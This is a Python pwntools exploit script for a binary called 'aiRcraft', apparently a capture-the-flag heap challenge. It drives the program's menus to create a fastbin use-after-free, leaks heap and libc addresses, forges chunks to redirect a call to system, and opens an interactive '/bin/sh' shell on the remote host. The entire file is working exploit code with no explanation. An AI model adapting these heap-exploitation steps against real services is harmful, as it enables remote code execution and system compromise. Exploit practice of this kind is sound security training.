#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('aiRcraft'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def buy_plane(name):
    global level
    assert level == 1, 'wrong level'

    r.sendlineafter('choice: ', '1')
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('name: ', name)

def build_airport(name):
    global level
    assert level == 1, 'wrong level'

    r.sendlineafter('choice', '2')
    r.sendlineafter('name? ', str(len(name) if len(name) > 15 else 16))
    r.sendlineafter('name: ', name)

def enter_airport(idx):
    global level
    assert level == 1, 'wrong level'

    r.sendlineafter('choice', '3')
    r.sendlineafter('choose? ', str(idx))
    level = 2

def select_plane(name):
    global level
    assert level == 1, 'wrong level'

    r.sendlineafter('choice', '4')
    r.sendlineafter('choose? ', name)
    level = 3

def list_planes():
    global level
    assert level == 2, 'wrong level'

    r.sendlineafter('choice', '1')

def sell_airport():
    global level
    assert level == 2, 'wrong level'

    r.sendlineafter('choice', '2')
    level = 1

def fly_to_another(idx):
    global level
    assert level == 3, 'wrong level'

    r.sendlineafter('choice', '1')
    r.sendlineafter('fly? ', str(idx))

def back():
    global level
    assert level != 1, 'wrong level'

    r.sendlineafter('choice', '3')
    level = 1

r = remote(HOST, PORT)
level = 1

# prepare fastbin uaf
build_airport('0')
build_airport('1')
buy_plane('p1')
select_plane('p1')
fly_to_another(0)
fly_to_another(1)
back()
buy_plane('p2')
select_plane('p2')
fly_to_another(0)
fly_to_another(1)
back()
enter_airport(0)

# leak heap
sell_airport()
enter_airport(1)
list_planes()
r.recvuntil('name: ')
r.recvuntil('name: ')
heap_base = r.leak() - 0x160
log.info('heap_base: {}'.format(hex(heap_base)))
back()

# leak libc
fake = flat(heap_base + 0x270, 'a'*0x18, heap_base + 0xc0, heap_base + 0xc0, 0, 0, 0)
build_airport(fake)
enter_airport(1)
list_planes()
r.recvuntil('Build by ')
r.recvuntil('Build by ')
libc_base = r.leak() - 0x3c3b78
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base
back()

# fastbin attack
build_airport('a'*0x40)
buy_plane(flat('/bin/sh\x00', 0x51))
pause()
fake = flat('a'*0x10, 0, 0, libc_base + 0x3c3b90, libc_base + 0x3c3b90, libc.sym['system']).ljust(0x40)
build_airport(fake)
select_plane('/bin/sh')
r.sendlineafter('choice: ', '2')

r.interactive()
